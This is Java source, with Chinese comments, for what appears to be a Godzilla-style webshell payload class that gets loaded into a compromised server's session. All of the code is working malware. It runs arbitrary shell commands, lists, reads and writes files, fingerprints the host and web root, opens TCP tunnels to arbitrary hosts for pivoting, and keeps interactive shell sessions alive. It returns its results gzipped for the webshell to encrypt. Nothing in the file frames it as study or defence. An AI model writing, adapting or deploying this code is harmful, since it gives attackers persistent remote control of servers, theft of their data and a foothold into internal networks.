// 哥斯拉型 Java 会话态 dispatcher：马侧把本类经 defineClass 存入 session，此后每次请求
// equals 三连注入上下文（ByteArrayOutputStream / ServletRequest / PageContext），toString()
// 触发执行。参数 = request 属性 "parameters"（Parameter 序列化字节流，客户端可再套 gzip——
// 魔数自检）；结果写 gzip(serialize({status,o})) 回 arrOut（马侧加密回传）。
// 方法分派（自有约定）：probe / cmd(c[,d]) / ls(p) / read(p) / write(p,b[,m])。
// 约束：默认包、全反射取上下文、单 class、零跨类引用；一次性装入 session 无需改名/补丁。
public class WsmG {

	// 隧道/终端会话态：类经 session 装载一次，静态字段跨请求持久
	static final java.util.HashMap<String, java.net.Socket> tunSock = new java.util.HashMap<String, java.net.Socket>();
	static final java.util.HashMap<String, java.io.ByteArrayOutputStream> tunBuf = new java.util.HashMap<String, java.io.ByteArrayOutputStream>();
	static final java.util.HashMap<String, Process> terms = new java.util.HashMap<String, Process>();
	static long seq = 0;

	java.io.ByteArrayOutputStream buf;
	Object req;
	Object pageCtx;

	public boolean equals(Object o) {
		if (o instanceof java.io.ByteArrayOutputStream) { buf = (java.io.ByteArrayOutputStream) o; return true; }
		// request 判别用 getInputStream：ServletRequest 有、PageContext 无（后者也有
		// getAttribute(String)，不能作判据——否则第三连注入会覆盖掉 request）
		try { o.getClass().getMethod("getInputStream"); req = o; return true; } catch (Throwable ignored) {}
		pageCtx = o;
		return true;
	}

	public String toString() {
		try {
			byte[] params = (byte[]) req.getClass().getMethod("getAttribute", String.class).invoke(req, "parameters");
			if (params == null) return "";
			params = maybeGunzip(params);
			java.util.HashMap<String, byte[]> m = parse(params);
			String method = str(m.get("methodName"));
			byte[] out;
			String status = "ok";
			try { out = run(method, m); }
			catch (Throwable e) { status = "err"; out = String.valueOf(e).getBytes("UTF-8"); }
			java.util.LinkedHashMap r = new java.util.LinkedHashMap();
			r.put("status", status.getBytes("UTF-8"));
			r.put("o", out);
			buf.write(gzip(serialize(r)));
		} catch (Throwable ignored) {}
		return "";
	}

	byte[] run(String method, java.util.HashMap<String, byte[]> m) throws Exception {
		if ("cmd".equals(method)) {
			String os = System.getProperty("os.name", "").toLowerCase();
			boolean win = os.contains("win");
			ProcessBuilder pb = new ProcessBuilder(win ? "cmd.exe" : "/bin/sh", win ? "/c" : "-c", str(m.get("c")));
			String d = str(m.get("d"));
			if (d.length() > 0) pb.directory(new java.io.File(d));
			pb.redirectErrorStream(true);
			Process p = pb.start();
			java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
			byte[] b = new byte[8192];
			int n;
			java.io.InputStream in = p.getInputStream();
			while ((n = in.read(b)) != -1) bo.write(b, 0, n);
			p.waitFor();
			return bo.toByteArray();
		}
		if ("ls".equals(method)) {
			java.io.File[] fs = new java.io.File(str(m.get("p"))).listFiles();
			StringBuilder sb = new StringBuilder("[");
			if (fs != null) {
				for (java.io.File f : fs) {
					if (sb.length() > 1) sb.append(",");
					sb.append("{\"n\":\"").append(esc(f.getName()))
						.append("\",\"d\":").append(f.isDirectory())
						.append(",\"s\":").append(f.length())
						.append(",\"r\":").append(f.canRead())
						.append(",\"w\":").append(f.canWrite())
						.append(",\"m\":").append(f.lastModified())
						.append("}");
				}
			}
			sb.append("]");
			return sb.toString().getBytes("UTF-8");
		}
		if ("read".equals(method)) {
			java.io.FileInputStream fi = new java.io.FileInputStream(str(m.get("p")));
			java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
			byte[] b = new byte[16384];
			int n;
			while ((n = fi.read(b)) != -1) bo.write(b, 0, n);
			fi.close();
			return java.util.Base64.getEncoder().encode(bo.toByteArray());
		}
		if ("write".equals(method)) {
			byte[] data = m.get("b"); // Parameter 序列化承载原始字节（免 b64 中转）
			if (data == null) data = new byte[0];
			java.io.FileOutputStream fo = new java.io.FileOutputStream(str(m.get("p")), "a".equals(str(m.get("m"))));
			fo.write(data);
			fo.close();
			return ("OK " + data.length).getBytes("UTF-8");
		}
		if ("probe".equals(method)) {
			Object rp = null;
			try {
				Object sc = req.getClass().getMethod("getServletContext").invoke(req);
				rp = sc.getClass().getMethod("getRealPath", String.class).invoke(sc, "");
			} catch (Throwable ignored) {}
			StringBuilder sb = new StringBuilder("WSM1|").append(str(m.get("t")))
				.append("|").append(System.getProperty("os.name", "?").replace(' ', '_'))
				.append("|").append(System.getProperty("user.name", "?"))
				.append("|").append(System.getProperty("user.home", "?"))
				.append("|").append(System.getProperty("user.dir", "?"))
				.append("|").append(System.getProperty("java.version", "?"))
				.append("|").append(Runtime.getRuntime().availableProcessors())
				.append("|").append(rp == null ? "" : String.valueOf(rp));
			return sb.toString().getBytes("UTF-8");
		}
		if (method.startsWith("t.")) return tunnel(method, m);
		if (method.startsWith("e.")) return terminal(method, m);
		throw new Exception("unknown method " + method);
	}

	// 隧道 ops：t.open(h,pt)→cid；t.push(b)；t.pull→[状态字节][数据]；t.close。
	// 状态字节 0x00=有数据/存活，0x01=连接关闭且无数据。
	byte[] tunnel(String method, java.util.HashMap<String, byte[]> m) throws Exception {
		if ("t.open".equals(method)) {
			String host = str(m.get("h"));
			int port = Integer.parseInt(str(m.get("pt")));
			java.net.Socket s = new java.net.Socket();
			s.connect(new java.net.InetSocketAddress(host, port), 8000);
			s.setTcpNoDelay(true);
			final String cid = "t" + (++seq);
			tunSock.put(cid, s);
			tunBuf.put(cid, new java.io.ByteArrayOutputStream());
			Thread r = new Thread(() -> {
				try {
					java.io.InputStream in = tunSock.get(cid).getInputStream();
					byte[] b = new byte[32768];
					int n;
					while ((n = in.read(b)) != -1) {
						synchronized (tunBuf) { tunBuf.get(cid).write(b, 0, n); }
					}
				} catch (Throwable ignored) {}
			});
			r.setDaemon(true);
			r.start();
			return cid.getBytes("UTF-8");
		}
		String cid = str(m.get("c"));
		java.net.Socket s = tunSock.get(cid);
		if ("t.push".equals(method)) {
			if (s == null) throw new Exception("tunnel " + cid + " not found");
			byte[] data = m.get("b");
			if (data == null) data = new byte[0];
			s.getOutputStream().write(data);
			s.getOutputStream().flush();
			return new byte[] { 0 };
		}
		if ("t.pull".equals(method)) {
			java.io.ByteArrayOutputStream buf;
			byte[] data;
			synchronized (tunBuf) {
				buf = tunBuf.get(cid);
				data = buf == null ? new byte[0] : buf.toByteArray();
				if (buf != null) buf.reset();
			}
			boolean alive = s != null && !s.isClosed();
			java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
			o.write(alive || data.length > 0 ? 0 : 1);
			o.write(data);
			return o.toByteArray();
		}
		if ("t.close".equals(method)) {
			if (s != null) { try { s.close(); } catch (Throwable ignored) {} }
			tunSock.remove(cid);
			tunBuf.remove(cid);
			return new byte[] { 0 };
		}
		throw new Exception("unknown tunnel op " + method);
	}

	// 终端 ops：e.open(c=命令行，空=/bin/sh)→tid；e.w(d=输入)；e.r→[状态][输出]；e.x。
	// 状态字节 0x00=运行中，0x01=进程已退出。
	byte[] terminal(String method, java.util.HashMap<String, byte[]> m) throws Exception {
		if ("e.open".equals(method)) {
			String cmdline = str(m.get("c"));
			String os = System.getProperty("os.name", "").toLowerCase();
			Process p;
			if (cmdline.length() > 0) {
				p = new ProcessBuilder(os.contains("win") ? "cmd.exe" : "/bin/sh",
					os.contains("win") ? "/c" : "-c", cmdline).redirectErrorStream(true).start();
			} else {
				p = new ProcessBuilder(os.contains("win") ? "cmd.exe" : "/bin/sh").redirectErrorStream(true).start();
			}
			String tid = "e" + (++seq);
			terms.put(tid, p);
			return tid.getBytes("UTF-8");
		}
		String tid = str(m.get("c"));
		Process p = terms.get(tid);
		if ("e.w".equals(method)) {
			if (p == null) throw new Exception("term " + tid + " not found");
			byte[] data = m.get("d");
			if (data == null) data = new byte[0];
			p.getOutputStream().write(data);
			p.getOutputStream().flush();
			return new byte[] { 0 };
		}
		if ("e.r".equals(method)) {
			java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
			if (p == null) { o.write(1); return o.toByteArray(); }
			try {
				java.io.InputStream in = p.getInputStream();
				int avail = in.available();
				if (avail > 0) {
					byte[] b = new byte[avail];
					int got = 0;
					while (got < avail) { int r = in.read(b, got, avail - got); if (r == -1) break; got += r; }
					o.write(0);
					o.write(b, 0, got);
				} else {
					o.write(0);
				}
			} catch (Throwable e) {
				o.write(1);
			}
			return o.toByteArray();
		}
		if ("e.x".equals(method)) {
			if (p != null) { p.destroy(); terms.remove(tid); }
			return new byte[] { 0 };
		}
		throw new Exception("unknown term op " + method);
	}

	static String str(byte[] b) { try { return b == null ? "" : new String(b, "UTF-8"); } catch (Throwable t) { return ""; } }

	static String esc(String s) { return s.replace("\\", "\\\\").replace("\"", "\\\""); }

	// Parameter 序列化：key + 0x02 + int32LE(len) + value（无表间分隔，读取按长度定界）
	static byte[] serialize(java.util.Map<String, byte[]> m) throws Exception {
		java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
		for (java.util.Map.Entry<String, byte[]> e : m.entrySet()) {
			o.write(e.getKey().getBytes("UTF-8"));
			o.write(2);
			byte[] v = e.getValue() == null ? new byte[0] : e.getValue();
			int len = v.length;
			o.write(len & 0xFF); o.write((len >> 8) & 0xFF); o.write((len >> 16) & 0xFF); o.write((len >> 24) & 0xFF);
			o.write(v);
		}
		return o.toByteArray();
	}

	static java.util.HashMap<String, byte[]> parse(byte[] data) throws Exception {
		java.util.HashMap<String, byte[]> out = new java.util.HashMap<String, byte[]>();
		java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(data);
		java.io.ByteArrayOutputStream key = new java.io.ByteArrayOutputStream();
		byte[] lenB = new byte[4];
		int c;
		while ((c = in.read()) != -1) {
			if (c == 2) {
				in.read(lenB);
				int len = (lenB[0] & 0xFF) | ((lenB[1] & 0xFF) << 8) | ((lenB[2] & 0xFF) << 16) | ((lenB[3] & 0xFF) << 24);
				byte[] v = new byte[len];
				int got = 0;
				while (got < len) { int r = in.read(v, got, len - got); if (r == -1) break; got += r; }
				out.put(new String(key.toByteArray(), "UTF-8"), v);
				key.reset();
			} else if (c > 32 && c <= 126) {
				key.write(c);
			} else if (c <= 32) {
				break;
			}
		}
		return out;
	}

	static byte[] maybeGunzip(byte[] d) throws Exception {
		if (d.length < 2 || (d[0] & 0xFF) != 0x1f || (d[1] & 0xFF) != 0x8b) return d;
		java.util.zip.GZIPInputStream z = new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(d));
		java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
		byte[] b = new byte[8192];
		int n;
		while ((n = z.read(b)) != -1) o.write(b, 0, n);
		return o.toByteArray();
	}

	static byte[] gzip(byte[] d) throws Exception {
		java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
		java.util.zip.GZIPOutputStream z = new java.util.zip.GZIPOutputStream(o);
		z.write(d);
		z.close();
		return o.toByteArray();
	}
}
